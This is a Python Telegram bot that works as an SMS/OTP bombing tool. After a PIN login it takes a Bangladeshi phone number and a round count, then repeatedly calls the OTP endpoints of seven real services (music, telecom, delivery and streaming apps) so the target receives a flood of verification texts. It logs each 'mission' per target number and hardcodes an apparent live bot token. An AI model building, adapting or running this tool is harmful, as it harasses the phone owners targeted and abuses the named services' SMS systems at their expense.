import telebot
import requests
import threading
import time
import json
import os
import pytz
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ---------- CONFIG ----------
API_TOKEN = '8519607285:AAFFBo2m3QiMmh00MUzt3Q6DbVWAipa5INg'
bot = telebot.TeleBot(API_TOKEN)

LOGIN_PIN = "RK2026"
BD_TZ = pytz.timezone('Asia/Dhaka')
HISTORY_FILE = "bombing_history.json"
WAKEUP_URL = "https://rksystemx.onrender.com/"

# ---------- WAKEUP / PING SYSTEM ----------
def wakeup_link():
    """Render link-ke active rakhar jonno auto-ping system"""
    while True:
        try:
            requests.get(WAKEUP_URL, timeout=10)
            print(f"[{datetime.now(BD_TZ).strftime('%I:%M %p')}] Wakeup Link Pinged Successfully!")
        except Exception as e:
            print(f"Wakeup Error: {e}")
        time.sleep(600) # ১০ মিনিট পর পর পিং করবে

# Background-e wakeup system start kora
threading.Thread(target=wakeup_link, daemon=True).start()

# ---------- DATA PERSISTENCE ----------
def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_history(data):
    with open(HISTORY_FILE, "w") as f:
        json.dump(data, f, indent=4)

# Globals
user_data = {}
history_db = load_history()
logged_in_users = set()

# ---------- API ENGINE ----------
def get_apis(phone):
    pz = phone[1:] if phone.startswith("0") else phone
    return [
        {"name": "SHADHIN 🎵", "url": "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq", "method": "POST", "json": {"msisdn": "880"+pz, "shortcode": 16235, "servicename": "Shadhin Music"}},
        {"name": "KHAODAO 🍔", "url": "https://api.eat-z.com/auth/customer/app-connect", "method": "POST", "json": {"username": "+88"+pz}},
        {"name": "WALTON 🔌", "url": "https://waltonplaza.com.bd/api/auth/otp/create", "method": "POST", "json": {"auth": {"countryCode": "880", "phone": pz}, "captchaToken": "recapcha"}},
        {"name": "APEX 👟", "url": "https://api.apex4u.com/api/auth/login", "method": "POST", "json": {"phoneNumber": phone}},
        {"name": "MY-GP 🗼", "url": "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", "method": "POST", "json": {"mobileNumber": phone}},
        {"name": "REDX 🚚", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method": "POST", "json": {"phoneNumber": phone}},
        {"name": "CHORKI 🎬", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "method": "POST", "json": {"number": "+88"+pz}},
    ]

# ---------- BOMBING CORE ----------
def bomb_task(chat_id, phone, amount, msg_id):
    apis = get_apis(phone)
    success, failed = 0, 0
    start_time = datetime.now(BD_TZ)
    
    user_data[chat_id].update({'status': 'running', 'round': 0, 'start_time': start_time})

    for r in range(1, amount + 1):
        if user_data.get(chat_id, {}).get('status') == 'stopped': break
        while user_data.get(chat_id, {}).get('status') == 'paused': time.sleep(1)

        for api in apis:
            if user_data.get(chat_id, {}).get('status') == 'stopped': break
            try:
                if api["method"] == "POST":
                    resp = requests.post(api["url"], json=api.get("json"), timeout=5)
                else:
                    resp = requests.get(api["url"], timeout=5)
                if resp.status_code in [200, 201]: success += 1
                else: failed += 1
            except: failed += 1
        
        user_data[chat_id].update({'success': success, 'failed': failed, 'round': r})
        running_time_str = str(datetime.now(BD_TZ) - start_time).split('.')[0]
        update_bombing_ui(chat_id, phone, amount, msg_id, running_time_str)
        time.sleep(0.3)

    # Grouped History Save
    log_time = datetime.now(BD_TZ).strftime('%d/%m/%Y - %I:%M %p')
    log_entry = f"🕒 {log_time} | ✅ {success} | ❌ {failed} | Rounds: {amount}"
    
    uid = str(chat_id)
    if uid not in history_db: history_db[uid] = {}
    if phone not in history_db[uid]: history_db[uid][phone] = []
    
    history_db[uid][phone].append(log_entry)
    save_history(history_db)
    
    bot.edit_message_text(f"🏁 **MISSION COMPLETED**\n🎯 Target: `{phone}`\n✅ Success: `{success}`\n⏱ Total: `{str(datetime.now(BD_TZ)-start_time).split('.')[0]}`", chat_id, msg_id)
    user_data[chat_id]['status'] = 'idle'

def update_bombing_ui(chat_id, phone, amount, msg_id, running_time):
    data = user_data[chat_id]
    text = (
        f"⚡ **RK-SYSTEM ATTACK** ⚡\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Progress: `[{data['round']}/{amount}]`\n"
        f"✅ Sent: `{data['success']}` | ❌ Error: `{data['failed']}`\n"
        f"⏱ Running: `{running_time}`\n"
        f"🕒 BD Time: `{datetime.now(BD_TZ).strftime('%I:%M:%S %p')}`"
    )
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("⏸ Pause" if data['status']=='running' else "▶ Resume", callback_data="pause_resume")
    markup.add(btn, types.InlineKeyboardButton("🛑 Stop", callback_data="stop"))
    try: bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

# ---------- HANDLERS ----------
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if str(chat_id) not in logged_in_users:
        bot.send_message(chat_id, "🔐 **ACCESS DENIED!**\n\nপাসওয়ার্ড দিয়ে লগইন করুন: `/login RK2026`", parse_mode="Markdown")
    else:
        main_menu(chat_id)

@bot.message_handler(commands=['login'])
def login(message):
    if len(message.text.split()) > 1 and message.text.split()[1] == LOGIN_PIN:
        logged_in_users.add(str(message.chat.id))
        bot.reply_to(message, "✅ লগইন সফল!")
        main_menu(message.chat.id)
    else:
        bot.reply_to(message, "❌ ভুল পিন!")

def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🚀 Start Attack", callback_data="setup"),
               types.InlineKeyboardButton("📜 History Group", callback_data="history_main"))
    bot.send_message(chat_id, "💎 **RK-SYSTEM CONTROL PANEL**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    uid = str(chat_id)

    if call.data == "setup":
        msg = bot.send_message(chat_id, "📞 নাম্বার দিন (১১ ডিজিট):")
        bot.register_next_step_handler(msg, get_number)
    
    elif call.data == "history_main":
        if uid not in history_db or not history_db[uid]:
            bot.answer_callback_query(call.id, "হিস্ট্রি খালি!")
            return
        markup = types.InlineKeyboardMarkup()
        for phone in history_db[uid].keys():
            markup.add(types.InlineKeyboardButton(f"📱 {phone} ({len(history_db[uid][phone])})", callback_data=f"h_{phone}"))
        bot.edit_message_text("📜 **টার্গেট নাম্বার লিস্ট:**", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("h_"):
        phone = call.data.split("_")[1]
        logs = history_db[uid][phone]
        text = f"📜 **History for {phone}:**\n\n" + "\n".join(logs[-10:])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="history_main"))
        bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "confirm_attack":
        data = user_data[chat_id]
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "⚙️ Initializing...")
        threading.Thread(target=bomb_task, args=(chat_id, data['target'], data['amount'], msg.message_id)).start()

    elif call.data == "pause_resume":
        user_data[chat_id]['status'] = "paused" if user_data[chat_id]['status'] == "running" else "running"
    
    elif call.data == "stop":
        user_data[chat_id]['status'] = "stopped"

# ---------- STEPS ----------
def get_number(message):
    if not message.text.isdigit() or len(message.text) != 11:
        bot.reply_to(message, "❌ সঠিক নাম্বার দিন।")
        return
    user_data[message.chat.id] = {'target': message.text}
    msg = bot.send_message(message.chat.id, "📊 রাউন্ড দিন (সর্বোচ্চ ১০০):")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = int(message.text)
        user_data[message.chat.id]['amount'] = min(amount, 100)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ CONFIRM", callback_data="confirm_attack"),
                   types.InlineKeyboardButton("❌ CANCEL", callback_data="setup"))
        bot.send_message(message.chat.id, f"🎯 Target: `{user_data[message.chat.id]['target']}`\n📊 Rounds: `{user_data[message.chat.id]['amount']}`\nনিশ্চিত করুন:", reply_markup=markup, parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ সংখ্যা দিন।")

print("✅ RK-SYSTEM PRO ONLINE WITH WAKEUP LINK")
bot.infinity_polling()
